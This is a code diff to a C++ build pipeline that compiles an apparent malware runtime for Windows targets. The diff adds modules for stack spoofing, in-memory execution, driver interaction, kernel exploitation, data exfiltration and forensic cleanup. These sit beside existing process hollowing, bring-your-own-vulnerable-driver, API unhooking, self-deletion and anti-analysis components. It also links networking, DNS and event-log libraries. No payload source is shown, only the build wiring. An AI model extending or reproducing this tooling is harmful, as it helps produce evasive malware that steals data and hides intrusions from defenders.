@@ -462,17 +462,24 @@ bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDi
     }
 
     std::vector<fs::path> sources = {
-        runtimeDir / "init" / "anti_analysis.c",
+        runtimeDir / "init"    / "anti_analysis.c",
         runtimeDir / "cleanup" / "self_delete.c",
         runtimeDir / "cleanup" / "logs.c",
-        runtimeDir / "vm" / "vm_interpreter.c",
+        runtimeDir / "vm"      / "vm_interpreter.c",
+        runtimeDir / "util"    / "mem.c",
     };
 
     if (isWindowsTarget && !noRuntime) {
-        sources.push_back(runtimeDir / "evasion" / "unhook.c");
-        sources.push_back(runtimeDir / "evasion" / "syscalls.c");
-        sources.push_back(runtimeDir / "execution" / "hollow.c");
-        sources.push_back(runtimeDir / "execution" / "byovd.c");
+        sources.push_back(runtimeDir / "evasion"      / "unhook.c");
+        sources.push_back(runtimeDir / "evasion"      / "syscalls.c");
+        sources.push_back(runtimeDir / "evasion"      / "stack_spoof.c");
+        sources.push_back(runtimeDir / "execution"    / "hollow.c");
+        sources.push_back(runtimeDir / "execution"    / "byovd.c");
+        sources.push_back(runtimeDir / "execution"    / "inmem.c");
+        sources.push_back(runtimeDir / "execution"    / "driver_interact.c");
+        sources.push_back(runtimeDir / "exploitation" / "kernel_exploit.c");
+        sources.push_back(runtimeDir / "exfil"        / "exfil.c");
+        sources.push_back(runtimeDir / "cleanup"      / "forensics.c");
     }
 
     for (const auto& src : sources) {
@@ -501,7 +508,7 @@ bool Pipeline::linkExecutable(const CompileOptions& opts, const std::string& cla
     cmd += " -o " + exe;
     bool isWindowsTarget = targetFlag.find("windows") != std::string::npos || targetFlag.find("mingw") != std::string::npos || targetFlag.find("msvc") != std::string::npos;
     if (isWindowsTarget) {
-        cmd += " -lntdll";
+        cmd += " -lntdll -lwinhttp -ldnsapi -lwevtapi";
     } else {
         cmd += " -ldl -lpthread";
     }
